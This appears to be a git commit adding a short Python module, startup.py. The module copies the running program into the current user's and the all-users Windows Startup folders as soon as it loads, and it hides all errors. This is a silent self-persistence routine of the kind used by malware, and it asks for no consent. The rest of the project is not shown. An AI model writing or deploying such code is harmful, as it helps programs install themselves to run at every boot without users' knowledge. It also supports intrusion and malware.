258cac9954b7ec552a765e3641bb27c1f321f0f9
Gum <96620548+Gumbobrot@users.noreply.github.com>
2023-03-25 16:56:39 +0100

    Add files via upload

---
+++ source/startup.py
@@ -0,0 +1,27 @@
+class StartUp():
+        import shutil
+        import os
+        from sys import argv
+
+        roaming = os.getenv("appdata")
+
+        startup_loc = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+        common_startup_loc = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\"
+
+        try:
+            shutil.copy(argv[0], startup_loc)
+        except Exception:
+            try:
+                shutil.copy(argv[0], startup_loc)
+            except Exception:
+                pass
+            
+        try:
+            shutil.copy(argv[0], common_startup_loc)
+        except Exception:
+            try:
+                shutil.copy(argv[0], common_startup_loc)
+            except Exception:
+                pass
+            
+StartUp
